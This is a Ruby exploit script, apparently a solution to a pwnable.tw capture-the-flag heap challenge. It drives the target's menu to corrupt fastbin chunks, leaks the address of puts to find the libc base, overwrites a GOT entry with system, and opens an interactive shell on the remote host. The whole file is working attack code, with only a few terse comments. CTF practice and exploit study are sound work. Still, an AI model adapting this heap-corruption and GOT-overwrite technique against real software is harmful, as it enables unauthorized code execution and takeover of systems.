#!/usr/bin/env ruby
require '~/Tools/pwnlib.rb'

local = false#true
if local
	host, port = '127.0.0.1', ARGV[0]
	puts_offset = 0x68f60
	system_offset = 0x3f460
else
	host, port = 'ctf.pwnable.tw', 31337
	puts_offset = 0x6f690
	system_offset = 0x45390
end
def add(size, name, secret)  
	@r.recv_until("Your choice :")
        @r.send("1\n")
	@r.recv_until("Size of heart :")
	@r.send("#{size}\n")
	@r.recv_until("Name of heart :")
	@r.send("#{name}\n")
	@r.recv_until("secret of my heart :")
	@r.send("#{secret}")
end
def show(index)
	@r.recv_until("Your choice :")
        @r.send("2\n")
	@r.recv_until("Index :")
        @r.send("#{index}\n")
end
def delete(index)
	@r.recv_until("Your choice :")
        @r.send("3\n")
	@r.recv_until("Index :")
	@r.send("#{index}\n")
end
def quit()
	@r.recv_until("Your choice :")
	@r.send("4\n")
end
def p64(*addr)
	addr.pack("Q*")
end
PwnTube.open(host, port) do |r|
	r.send("4869\n")
	@list = r.recv_capture(/Your secret : (.*)\n/)[0].to_i(16)
end
puts "[!] list : 0x#{@list.to_s(16)}"

PwnTube.open(host, port) do |r|
	@r = r
	
	puts_got = 0x602020
	got_table= 0x601ffa
	start = 0x400870
	
	add(0x40,"0"*8,"0")
	add(0x100,"1"*8,"1")
	add(0xf0,"2"*8,"2")
	delete(1)
	delete(0)
	
	# fake fastbin malloc in got_table
	add(0x48,p64(0x60,got_table,0x60),"0"*0x48)
	add(0x90,"1"*8,"1")
	add(0x50,"3","3")

	delete(1)
	delete(2)

	# fake fastbin malloc in @list
	add(0x100,";sh;","a"*0x90+p64(0,0x60,@list,0)+"a"*0x40+p64(0x60)+p64(0x11)[0...-1])
	delete(1)
	delete(3)
	add(0x100,";sh;","a"*0x90+p64(0,0x60,@list,0)+"a"*0x40+p64(0x60)+p64(0x11)[0...-1])
	
	add(0x50,"2","zzzz")
	
	# malloc in @list
	add(0x50,"3",p64(0x60,0x60,0x60,puts_got)) 
	
	show(0)
	@r.recv_until("Secret : ")
	libc_base = @r.recv(6).ljust(8, "\x00").unpack("Q")[0] - puts_offset
	system = libc_base + system_offset
	
	puts "[!] libc base : 0x#{libc_base.to_s(16)}"
	puts "[!] system : 0x#{system.to_s(16)}"
	
	# malloc in got_table
	add(0x50,"4"*8,"a"*6+p64(0)+p64(system)[0...-1])
	add(0x100,"5","sh\x00\n")
	delete(5)
	@r.interactive()
	quit()
end
